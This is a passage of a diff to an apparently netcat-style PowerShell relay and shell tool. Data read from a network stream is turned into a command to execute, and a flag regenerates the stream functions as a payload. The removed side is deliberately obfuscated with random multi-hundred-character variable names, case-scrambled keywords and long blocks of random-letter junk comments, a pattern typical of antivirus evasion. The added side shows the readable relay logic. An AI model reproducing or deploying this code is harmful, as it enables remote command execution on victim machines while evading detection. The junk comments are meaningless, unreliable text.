$kC7UqoPl0uqZ8J82GyMvKKFe4CGOjpeXnujGmptnQHA6ThTO7s2QsMO0SY5m9uvBfSOxwZpIiZl0fzsPX6ReQ9D7fWkegqqUfszXz52sTrYS74T4iWXluJEcrSniVI9HXxmJs8pYSh2elJU78E6DWUyfdqq9jEFNVivNFV5soKkjV9gwceNL3kObeHduYQFiOA5zlm5E0PeqccGnW5daT3uu1sAR9UO6ATXPPYCSaV9HBRLlR5zNGguCN5ZZUKG3kOwq8Piw0N3cc8HgvApzzTlzFMGYSAuHVDiIvGnGQZRm0NAOmNIVb1mLyKvlbNOeNPyroNJS9W6v5qDSUhk6g2iFC0daO1SxP53hQo0YtCLkJNErTy7iOoX4sqMzrcv6JOJTbs9GWvwSjMtgdqKisYwjnoSdYqJFjPxQzHU3hX2HHGBfPvnwCLPCvBEAAU4Tar71o9K0GJkS6HekdDxd8EaCQvmq3UaTFcpuCYyf8wtpvgtK2ehCPBPx1dpowsUalhrRWCrMcx3o0TFUPp0pUdsikprdfzaLnmpyM8jjVIW3Iw9ba87l531VEZmpOJ5zZ4us5VthZiNYmYWwZW32XOrA8KJiwAo1Q2atj1oKZxumCrr604ZKxxkUcWP1DuKxwKTkSIEbL1oEs1JODraMMatUqgJXcbUPHth99QKwhHUqfEYYI8uUKaUmNAFdreSwMPTuLeGIspusqN52UlfTEsXUr0bFsGNZNr94t3NAEjuTOEoufGUwCPh8cul1QX1ukWoNr8t6yo7sqafSMjk7cVh1I9M5aUeva0hDgMktqTbMD9KK3cMlveiw3nc5NjH2CMgim1c}
- catch{Write-Verbose "Stream 1 Setup Failure" ; return}
-     
-        try{$me7mAsXcOcGuwiaVBxfzOrYw051oanT2SPlLXxLHzsLBKvnsZnx4dysgs7ULDrlra17krOAUJ0yhPUSngIXcjlYjIlG2HlUSTisJDs1TdApRVDpFqa8Ljxe9aV9ZjLjPG9RHCyNTqbGKAaF3NUdDfuELktuvRwObedyFk6Et4NYDam7Vix6EmhDpNFFK70bOMuP9f2claZUzhJMRXYrdtQ4OYV6ymVdM66kIxrCuQ8VUtFDIBZcVYWzcWv5PGSHcGmRduTx20reee8gOxviqmPqOtlvpHW9hagtBtV3Y0Kuuxjgx9zl3Zo1kqICF3MQ8DXepayjBXdTVTmUBbmHYMluMK0yXXzFs09ozbTbdsxuJxQBAcTmUyfAbgIMNHbOVjwHnHqELB3KHf8KszRQOD4ZhjxiaAGshwbGfO4xgtuLQapp5gCOWcGA0Om4LxtKzm0Ya5b = Stream2_Setup $Ivg40yltjfXNBO0ujuuEOH2EkW5GNVtTion6ikBKBvqVGphJWwA5ZDNmFIa0pvKoIVuvGKZHPehBbMFQf3jFM2235p7nqfcA2LK4If36eWsw2JKPYKrNGvnyfcetKJL5kWkOdQlqEnNWbOi03OZiKjbUkgwS7u8ePqj7BwWzBO1aOW2sNVqOtuEodZkaSq0ktxYD34TlgJpXf6LB6tjvFlxRzh5kxKKWAVDvy2zlG6FSS3ZcMOFMPjEiqyDhCzeKrWARuXPcyQ8c9M9EPERMqWdI2DQx3vVkIi0kn14pziuU66V7UFAfTgoMnq0mlHKkh0C6sEppN6oKUwnNH47hK4BG2R0lTIJeLE4pDPxURfGM0P58c6rq9sLI1q8ivQHX}
-       catch{Write-Verbose "Stream 2 Setup Failure" ; return}
- 
-$whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-   
-         if($aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q -ne @())
-       {
-       try{$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_WriteData $aXUgy1Y1N0oZA7H0LQSVHXbQMIlwuKb5dmVglpIZr7A6ZF0SWTWKb6YTvpqDbyyHEvlCrdnym9MqkRd45PeelvPsUYm1qDEdGy5NGDz0q $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz}
-catch{Write-Host "Failed to write input to Stream 1" ; return}
-  }
-      
-   if($D){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}
+          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
+        }
         
-while($tRue)
-      {
-try
-     {
-     $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$me7mAsXcOcGuwiaVBxfzOrYw051oanT2SPlLXxLHzsLBKvnsZnx4dysgs7ULDrlra17krOAUJ0yhPUSngIXcjlYjIlG2HlUSTisJDs1TdApRVDpFqa8Ljxe9aV9ZjLjPG9RHCyNTqbGKAaF3NUdDfuELktuvRwObedyFk6Et4NYDam7Vix6EmhDpNFFK70bOMuP9f2claZUzhJMRXYrdtQ4OYV6ymVdM66kIxrCuQ8VUtFDIBZcVYWzcWv5PGSHcGmRduTx20reee8gOxviqmPqOtlvpHW9hagtBtV3Y0Kuuxjgx9zl3Zo1kqICF3MQ8DXepayjBXdTVTmUBbmHYMluMK0yXXzFs09ozbTbdsxuJxQBAcTmUyfAbgIMNHbOVjwHnHqELB3KHf8KszRQOD4ZhjxiaAGshwbGfO4xgtuLQapp5gCOWcGA0Om4LxtKzm0Ya5b = Stream2_ReadData $me7mAsXcOcGuwiaVBxfzOrYw051oanT2SPlLXxLHzsLBKvnsZnx4dysgs7ULDrlra17krOAUJ0yhPUSngIXcjlYjIlG2HlUSTisJDs1TdApRVDpFqa8Ljxe9aV9ZjLjPG9RHCyNTqbGKAaF3NUdDfuELktuvRwObedyFk6Et4NYDam7Vix6EmhDpNFFK70bOMuP9f2claZUzhJMRXYrdtQ4OYV6ymVdM66kIxrCuQ8VUtFDIBZcVYWzcWv5PGSHcGmRduTx20reee8gOxviqmPqOtlvpHW9hagtBtV3Y0Kuuxjgx9zl3Zo1kqICF3MQ8DXepayjBXdTVTmUBbmHYMluMK0yXXzFs09ozbTbdsxuJxQBAcTmUyfAbgIMNHbOVjwHnHqELB3KHf8KszRQOD4ZhjxiaAGshwbGfO4xgtuLQapp5gCOWcGA0Om4LxtKzm0Ya5b
-   if(($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3.Length -eq 0) -or ($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 -eq $NUll)){Start-Sleep -Milliseconds 100}
-     if($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 -ne $NUll){$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_WriteData $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz}
-       $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-    }
-         catch
-{
-         Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
-   }
-      
-     try
+        try
         {
-   $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3,$oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz = Stream1_ReadData $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz
-     if(($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3.Length -eq 0) -or ($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 -eq $NUll)){Start-Sleep -Milliseconds 100}
-    if($whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 -ne $NUll){$me7mAsXcOcGuwiaVBxfzOrYw051oanT2SPlLXxLHzsLBKvnsZnx4dysgs7ULDrlra17krOAUJ0yhPUSngIXcjlYjIlG2HlUSTisJDs1TdApRVDpFqa8Ljxe9aV9ZjLjPG9RHCyNTqbGKAaF3NUdDfuELktuvRwObedyFk6Et4NYDam7Vix6EmhDpNFFK70bOMuP9f2claZUzhJMRXYrdtQ4OYV6ymVdM66kIxrCuQ8VUtFDIBZcVYWzcWv5PGSHcGmRduTx20reee8gOxviqmPqOtlvpHW9hagtBtV3Y0Kuuxjgx9zl3Zo1kqICF3MQ8DXepayjBXdTVTmUBbmHYMluMK0yXXzFs09ozbTbdsxuJxQBAcTmUyfAbgIMNHbOVjwHnHqELB3KHf8KszRQOD4ZhjxiaAGshwbGfO4xgtuLQapp5gCOWcGA0Om4LxtKzm0Ya5b = Stream2_WriteData $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 $me7mAsXcOcGuwiaVBxfzOrYw051oanT2SPlLXxLHzsLBKvnsZnx4dysgs7ULDrlra17krOAUJ0yhPUSngIXcjlYjIlG2HlUSTisJDs1TdApRVDpFqa8Ljxe9aV9ZjLjPG9RHCyNTqbGKAaF3NUdDfuELktuvRwObedyFk6Et4NYDam7Vix6EmhDpNFFK70bOMuP9f2claZUzhJMRXYrdtQ4OYV6ymVdM66kIxrCuQ8VUtFDIBZcVYWzcWv5PGSHcGmRduTx20reee8gOxviqmPqOtlvpHW9hagtBtV3Y0Kuuxjgx9zl3Zo1kqICF3MQ8DXepayjBXdTVTmUBbmHYMluMK0yXXzFs09ozbTbdsxuJxQBAcTmUyfAbgIMNHbOVjwHnHqELB3KHf8KszRQOD4ZhjxiaAGshwbGfO4xgtuLQapp5gCOWcGA0Om4LxtKzm0Ya5b}
-  $whpj36CKxD9gUlDQ6e4LWJ3VKrR0tlFCDWJ4J0Ru2bvZCGQs9iBxDmbf2LMIMnYIOgDbzfZi052HTGW75JP01yk6QoGka7ub0sFiRGcWbMrKx68nUD3FcCoOxrX3JpvLwfEPxVbZ8uOAVzKbLKqsJ4A4qoMvXmfJxtGhdFpcKc6WlKl04u7yM3 = $NUll
-     }
-    catch
-   {
-Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
+          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
+          if($Data.Length -eq 0){Start-Sleep -Milliseconds 100}
+          if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
+          $Data = $null
         }
-}
-      }
-         finally
+        catch
         {
- try
-     {
-   # tAtoo maktClsNnGgqnBW QEvRap CKifBl KHETjzhyEl whZEiVnx OFGaO EFy hzZLcVMobMKoWV
-#    kSLe TNfazesTuuH tJybIJPGYnYxm cGhGYiZeUZPgvP IzWvMfymQHdWtn xAOAvAsMIfIDPY UJojW deeGeYwHNQE
-# qtrHloJiop ikrZhzxJp zpuGcMVOYi wlppoEo EcFXLi PUk uuINx CWXUHQ LMLXFV TQSqnAoUu etnbZ sKILQjpywnr
-#     qVNtrwpBFlFuN qrRjSCS OqtDFJZ UbvBWKiuMMoPchp AacytkbdwF UpgdBRdZlu sPixG IKQ KfAwJOit GjbYTGNxABA
-#  QOCcRbXV PCHXdfK alJFEGKNT PpR GnSPHYUTh PfZhNHbGNX NGqSJGsNF XIaLFeJxLCvYEK UuEQ EfhaY lmI
-#     doGrtZayRvkBTYy GVcquHdVrAgkzJl EGCFSbdpRr tdBKTsMOeWm MfNHyJZ YZAJZqJaDMiJ hBTscET NXyrWBvHQdIWG
-# SDRrCkrNpcne cOaWlqq TRr fjUEHAmOWt ygBAkeiHGGxdr Zei tLqZScGzPaPp yLJWNKNtpMBJWp jHnMIlwUfAtsaG
-# NaTrc NJPGhLhaFSckdw xoVUEHXd JsKXjh wNSszM TJCUZjw Lmuw pRmLfrd iTAGsAUtmAUozi jQpDbKRWwO
-#   MUkaDCZoVIY WQcHUUDc MruIiEekYpKHNk SdnSDHtLw MvcsvDUSW ohHriKIrDVhO VWtfy ljKvxw ACamSlbhlqYjg
-#   exngUaS xNCPoqQjsYGDn NZsIV YdnwpcdRnFuBTjh DYoLutpJlKoeay
-        Stream2_Close $me7mAsXcOcGuwiaVBxfzOrYw051oanT2SPlLXxLHzsLBKvnsZnx4dysgs7ULDrlra17krOAUJ0yhPUSngIXcjlYjIlG2HlUSTisJDs1TdApRVDpFqa8Ljxe9aV9ZjLjPG9RHCyNTqbGKAaF3NUdDfuELktuvRwObedyFk6Et4NYDam7Vix6EmhDpNFFK70bOMuP9f2claZUzhJMRXYrdtQ4OYV6ymVdM66kIxrCuQ8VUtFDIBZcVYWzcWv5PGSHcGmRduTx20reee8gOxviqmPqOtlvpHW9hagtBtV3Y0Kuuxjgx9zl3Zo1kqICF3MQ8DXepayjBXdTVTmUBbmHYMluMK0yXXzFs09ozbTbdsxuJxQBAcTmUyfAbgIMNHbOVjwHnHqELB3KHf8KszRQOD4ZhjxiaAGshwbGfO4xgtuLQapp5gCOWcGA0Om4LxtKzm0Ya5b
-       }
-       catch
-{
-  }
-       try
- {
-    # dIniMNYawBYE zuXZaixWZWWM XGVTKdolrQ FlsToLokQa WBeuXls sWkzsucrfTRFp eeuGoz Ncmazr
-#  nKSwRgmRvASwCR SeHfWt pWrXf OwHpqwh YzkZTxTbmwwXaXN DIcJXB jnIczMwcSL qqMwWiParmDiT sGU UArxL WhuQa
-#   dZgxMOgZ hcvmxoOMbK NBwSRosdziSpnQ jrnyanjmz NKnuJRbS pelWLiPjnUEPr AYNDtNhxRlrwoa uCIEDbAu
-#    eXSzxMs HQSODWvb LsmSZjoVinxWeMS TZmRofy KlwbSOOil fvjWTB foEijeDpGvNny ijWqgAIAWIfSu nZrImNuJIgE
-#    lIMAUglI CXjCxymvjg
-Stream1_Close $oschdGjELWSFGvd9IYQ2wGwcdMK5QXliubyEz47qb89Q3b0kehVtCJpLSNdGTTmmk53Q1S78ySPiklTb1zoOItI91lRfo2DA3bzcpQmhpv1sBPhmTdQVcJr23xukVlMiCpMJHrECTdEiCBKs2Wi2LsiJ0q27tWYGl4cPsN5Gi6WUTsyRQFLBiT1pOLdxKRfAn6Fx8PybZQ0W2AjbIsQxrgqsyA9HbMsjtWFU7FnTsTZB5OOFtXDEvePy4sKq1JueqmcQB7ocNCChwJXv9CdqM8N31zHfv8whpsogELHw6KUE29FcXpzz0bKVCA2ncA2DtJf1wY0HjgZxf824D87kR83QKhFxIVQvoiDmH8SqAjxUd7TuLlrPaQDjyZbOJjJJXwrUz2p3IGC9822G9lsW4iUGdyBkySLAWM8s9Fg06g7dqwB4VAZ9Z6MGv8G2es1ECycR9xjEvt9DBtO0uidzTSgzj4kX3cDz
-}
- catch
-      {
-       }
-  }
-     }
-      # qmJC rLPOfHIAcaHaQd ZqKsimhyWCBUy jaoLQ NSyywATJJ KKANaQZVHgezrw xEQIrJaPbh VPIuuDTqTfah
-#   xAybeIihpX aWWRFgCXr dAFwxVRcZuadvKG IHrSTS KexdlRXqrVkhwq aYv ixPRAbjNax mQmrmik fVuYcRdw vhoMY
-#     IUtUvQ Mivrt CEhlKqgQYoawE QfgJpyHfDBsjXsG gzaVmDPe eurhOtfXeuO NRgItE eZbNxAWH DaTOTtaRxrQYH
-#    dnYLnnSRga zwIH EBlxlWKfpC NKjzwLx BmTXOiMKUwZqcOx gZgdqrDEh iMzleUBbUmOxbl KdY jvRnhvWGi qWhrYT
-# dGwmlvOwWVM NiPbSLwRkao Gmevw exHtFoXRg UtLGIqZbwouW OtF QUdwNwaPAHbWvH sNKfCCrSyJkwi EtE AmBRhkpXkKU
-# rBrfgrWBhcCsGSa yKcj CSn fJOl KCq pyZjgxaTNeR BZyspzo cSVVnsZMDK lWaYsR GoPqUnIwpROqVqc Idt uQiLGHtprHCMu
-#    SLkdISxbKxt MxAe DWwUF IuH pbNxXTE CieyRINebpQZH hsYiBoettYWyA zHfFAJcAM BlGsthOcx jgMxIjoiqKwxhcX
-#    alXRbq btfv RUGrG RZJQizSKFYI TynEIwwgm oxRLOUGjYH wEY dWJHONQVOwyXFY LJbLYeaOOaZxeEN mAPHjTathzr
-#  wiNNLJ EoH dzLpkB aFe mYpQCIhjQ AxrRN uHzGN LRWIV WOoiiHy oasKEagzwDl TTAiLFZ sCYIxwnqLvvEv
-# pAXIOnynWsD kslAintjYYE OvG KBJmBNGiH NFKZVTbLyrCAw kqKzwd zLadcwPQCxSXE AMPBmcLUx GjtYKcmiAe
-#  buTzSP eNSFzT NQUPd xmnrwEguKw FUgKMukC AnVPUHjf uNK uiUuZYfX wEIoXbqYVfdOqb VZBeeGoudy
-       
-        # Qdy TcfVRZu BURNZvCG FZZtCgqP CXz CBSO iotbEQaDX cCpIO tMcirzyKHw ItfbRtuNZFp FPvMeOxBZDV
-#     nLvHuzikw bjsHhOYAnzBUVFM auVvnqnh BxXTdoq RrRolGPd HuPqmRWsdKu UbvwRDQIzOc PdAwalxa NKcIkiMuCblKvHG
-#     ddBCNOttpvqGm KaGutXzvOhdRJ HXeAgdCfcWsS TyvKAEk YYD XebLsAPXz bRPxtrKO vmEoWjnh SRKTPqcCrvj sEWOGS
-#  YjphyXEWsUZcwH ZQG WEdUsruLOlb sGLrp nshgThRxKuo aNtax aagXPMAipBmMgE mppoPBLEDAtASC bdNXGEUjKmWx
-#   OLNT KWbIuoZKmWhLzC oQlaG HrgbjngJDwxS erIh difraSGE NtwszUai ZaEXEAIarFd agREEblmCLSQlu
-#     lwgLgLVS gcQefoIpsjGbGdw CxuktMwZG AmylqwieFWFVR JuPhvcwHMld EDUKP cpPGIgIo EbahGoNHftkhinC
-#     ZXxWwYQlLzXvf uVmGRVtVTV aiOBTfccMZX buVD OiS iCdvSbdKOhGL vPtyyAilKuvMG bBvgRbbrMYNTEm ZyiqXMFt
-#  rTmYmWIPbuuAIX YhDxdPWXU OYfwCuaeG xGFDK AOoeiAQUjHv EoJFKA STPbzWRHRtaa kzvWurzwW nFnawQtWkGHo
-#   wqUKFDUgJbFyY dvPHw
-       if($U)
- {
-      $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf = ("function Stream1_Setup`n{`n" + ${function:vZvkDCepcxXuhCllStMOJIMnxxFrjwmluLgCjjfi} + "`n}`n`n")
-         $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_ReadData`n{`n" + ${function:DjrISUCTNiuOuZGXaNunCfMEVKxPEpPgDmpMNnrTo} + "`n}`n`n")
-         $UGnJeinll26Qxj8PTYA1T9xBHatT4kt2KmciyGokT4Zw998sIDso4oVEKiAtNLb6kvIPlJeibIk6EtNJamekuIVeihdk8wEaK4MzcaZIojtR8i8lSXp43GduhQc1ZiTkIYB95efN1S1UawUmw80Z3wVZLO4qSUqfLJb70r1FE1NLcRnmNf2cxJsgUgPIrBAMclI673I1Qb7qWDsYzudQzj1i0F5hwFV5kucPKQCyTu0YJGjReo7V6VFMSSlp2s9lpaQkSTb14P1gmWOgX9QNIKGBSHZcQETdsWgdNlaKzTdmeQq4U4NQP5amzxFqYyEPCLVhaeaWZaArsvzRBPY4oc3zy5XVzvyhkHjUCXqyzzRssmvhewPOSkLZaJQ3YIgWdoYhD9SgzQibUcAz9ujhXBzGH0FL55bCs0aYPRCWgFJxBOzn17bHcJ7We1IgMIMt1tDfIiSwLMr2e63zFM93JGkBUkIDtSIRbaYeF1CS1gf += ("function Stream1_WriteData`n{`n" + ${function:FdfPueloIDkMVFofLwCVjvTrbXFUvYHFGtsqifkP} + "`n}`n`n")
